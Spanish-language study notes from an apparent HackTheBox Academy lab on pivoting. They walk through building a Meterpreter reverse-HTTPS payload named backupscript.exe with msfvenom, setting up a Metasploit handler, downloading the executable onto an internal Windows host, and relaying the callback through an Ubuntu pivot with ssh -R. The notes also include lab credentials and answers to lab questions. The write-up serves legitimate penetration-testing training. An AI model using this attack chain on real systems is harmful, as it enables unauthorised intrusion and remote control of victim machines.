Existen ocasiones en que podríamos reenviar un servicio local a un puerto remoto.

Vamos a considerar el escenario en que querramos acceder por RDP a la máquina "Windows A".
Podemos hacerlo, como ya sabemos, a través del servidor UBUNTU, el cual se encuentra entre medio de la atacante y la víctima con ambas interfaces de red.
![[33.webp]]

**¿Pero que pasa si quisiésemos obtener una reverse shell?

La máquina Windows cuenta exclusivamente con una interfaz de red 172.16.5.0/23, mientras que la atacante se encuentra en la 10.xx.xx.xx.
Si con metasploit ejecutásemos un módulo para obtener una "reverse shell", no podríamos establecerla debido a que el servidor WINDOWS_A no sabe como enrutar el tráfico desde 172.16.5.0/23 para llegar a la red del atacante (10.129.xx.xx./xx).

Hay ocasiones en que una conexión RDP no es suficiente para el pentesting que estoy haciendo, y necesitaré establecer una sesión de Meterpreter.
En estos casos, tendríamos que encontrar un "PIVOT HOST".

Para conseguir una sesión shell-meterpreter en Windows_A, crearé un payload en meterpreter pero la conexión inversa del PAYLOAD (L_HOST) sería el servidor UBUNTU (172.16.5.129).
Usaremos el puerto 8080 del servidor UBUNTU para reenviar todos los paquetes al puerto 8000 de nuestra máquina atacante, la cual tendrá un listener de metasploit. 

## Creando un payload con msfvenom
```shell-session
Polika4RM@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

- lhost= \<InternalIPofPivotHost> = máquina ubuntu intermedia.
  Aquí LHOST=172.16.5.129 = donde la víctima intentará conectar.

#### Configurando e iniciando multi/handler

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
Hay dos usos distintos de LHOST en este escenario:
- LHOST cuando generas el payload (msfvenom):
  Es la IP a la que la víctima intentará conectarse cuando ejecute el payload. Debe ser una IP alcanzable desde la máquina víctima (la máquina UBUNTU).
- LHOST cuando configuras el handler en msfconsole:
  Es la IP en la que Metasploit se bindea (escucha) en la máquina donde corre el handler. No le dice al payload a dónde conectar; le dice a tu handler en qué interfaces debe aceptar conexiones entrantes:
```
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)       <------ LHOST es la IP que escuchará
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```
El poner LHOST 0.0.0 le dice a metasploit que bindee el handler en todas las interfaces IPv4 locales (es decir, que escuche en cualquier IP del equipo donde corra el Handler).

## Transfiriendo el Payload al Pivot Host
- El siguiente comando copia el archivo backupscript.exe al Host Ubuntu haciendo uso del protocolo "scp" (Secure Copy -> SSH).
- La dirección donde se pegará el archivo se especifica trás ">". 

```shell-session
Polika4RM@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00
```

Con esto, desde el PIVOT HOST ubuntu podemos abrir un servidor python3 con:
```
ubuntu@Webserver$ python3 -m http.server 8123
```

Como tenemos sesión por RDP con el cliente, nos lo descargaremos desde la máquina víctima con:
```
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"¡
```


Una vez tengamos descargado el Payload en nuestra máquina víctima WINDOWS_A, podremos ejecutar el "SSH REMOTE PORT FORWARDING" para reenviar las conexiones desde el puerto 8080 del servidor Ubuntu, al servicio de escucha msfconsole seteado en el puerto 8000.



## Usando SSH-R
Usaremos el argumento -vN en nuestro comando SSH para que sea más detallado y no solicite el shell de inicio de sesión. El comando -R solicita al servidor Ubuntu que escuche en <direcciónIPobjetivo>:8080 y reenvíe todas las conexiones entrantes en el puerto 8080 al servicio de escucha de msfconsole en 0.0.0.0:8000 de nuestro host de ataque:


```shell-session
Polika4RM@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Una vez establecido esta conexión ssh y teniendo en escucha el listener de msfconsole, podremos ejecutar desde la máquina víctima el ejecutable "backupscript.exe". 

Nuestra sesión de Meterpreter debería indicar que nuestra conexión entrante proviene de un host local (127.0.0.1), ya que recibimos la conexión a través del socket SSH local, lo que creó una conexión saliente al servidor Ubuntu. Ejecutar el comando netstat puede mostrarnos que la conexión entrante proviene del servicio SSH.

La siguiente representación gráfica ofrece una forma alternativa de comprender esta técnica.![[44.webp]]
---
**Target: 10.129.184.227**
**SSH to  with user "ubuntu" and password "HTB_@cademy_stdnt!"**
 **1. Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**

Me conecto por SSH a la máquina PIVOT HOST intermedia (UBUNTU):
```
ssh ubuntu@10.129.184.227
```

y desde la sesión ssh realizo un IP A:
```
ubuntu@WEB01:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:ed:2a brd ff:ff:ff:ff:ff:ff
    inet 10.129.184.227/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 3566sec preferred_lft 3566sec
    inet6 dead:beef::250:56ff:fe94:ed2a/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe94:ed2a/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:83:89 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.129/23 brd 172.16.5.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:8389/64 scope link 
       valid_lft forever preferred_lft forever
```

Veo como a parte de la interfaz "lo", tengo la ens192 (que es la que tiene comunicación con la máquina atacante), y tengo la "ens224", con una IP de máquina 172.16.5.129/23.

**2. What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**
Respuesta teórica: 0.0.0.0

